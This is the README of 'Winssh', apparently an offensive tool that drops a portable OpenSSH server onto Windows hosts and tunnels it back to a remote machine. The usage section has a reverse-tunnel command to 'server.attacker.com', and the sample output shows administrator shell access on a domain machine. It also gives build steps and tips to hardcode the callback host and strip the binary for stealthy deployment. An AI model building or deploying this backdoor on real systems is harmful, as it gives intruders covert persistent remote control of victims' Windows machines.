# Winssh

Spawns a ssh server on windows. No installation required.
Based on https://github.com/PowerShell/Win32-OpenSSH/

## Usage

When launched without arguments, `winssh.exe` default to start an OpenSSH server on port 127.0.0.1:8022.
You can specify a port using:
```
winssh.exe --port <port>
```

You can also specify a server and port to connect back to using:

```
winssh.exe --tunnel-server server.attacker.com --tunnel-port 2222
```

Then on your machine, you can just connect to the ssh port you forwarded:

```
ssh -i files/key dummy@localhost -p 8022
WORK-JUNON\administrator

ssh -i files/key 'WORK-JUNON\administrator'@localhost -p 8022
work-junon\administrator@S021M015 C:\Users\administrator.WORK-JUNON>
```
Note that the server banner is the username we need to use to connect!

On every build new keys will be generated. After starting the server you can use the "key" from the files directory. The key `key_reverse` from the files directory is used to connect back to the remote server (if specified) so you will need to add it to your authorized_keys file, e.g.:

```
cat files/reverse_key.pub >> /home/tunnel/.ssh/authorized_keys
```

## Compile

```
rustup target add x86_64-pc-windows-gnu
rustup toolchain install stable-x86_64-pc-windows-gnu
```

Windows:
```
cargo build --release --target x86_64-pc-windows-gnu
```

To reduce the filesize further, you can strip the binaries with `strip`.


## Other

If you want to run without any arguments modify the source to hardcode the default values for tunnel-server and both ports.